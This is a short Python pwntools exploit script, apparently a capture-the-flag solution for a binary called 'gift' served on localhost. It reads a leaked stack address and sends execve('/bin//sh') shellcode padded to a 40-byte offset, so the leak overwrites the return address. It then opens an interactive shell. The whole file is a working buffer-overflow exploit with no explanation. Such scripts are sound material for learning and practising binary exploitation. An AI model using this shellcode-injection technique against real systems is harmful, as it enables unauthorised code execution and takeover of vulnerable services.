#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("../Public/gift")
context.terminal = ['terminator', '-e']

gs = \
'''
entry
'''

HOST = ("127.0.0.1:4337").split(":")

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*HOST) 
    else: 
        return process(elf.path)


def pwn():
    io = start()

    rip_offset = 40
    shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

    io.recvuntil(b":\n")
    leak = pack(int(io.recvline().rstrip(b"\n").decode()))
    
    payload = flat([ 
        shellcode,
        b"A" * (rip_offset - len(shellcode)),
        leak,
    ])
    
    io.sendlineafter(b"?\n", payload)
    io.interactive()

    
pwn()
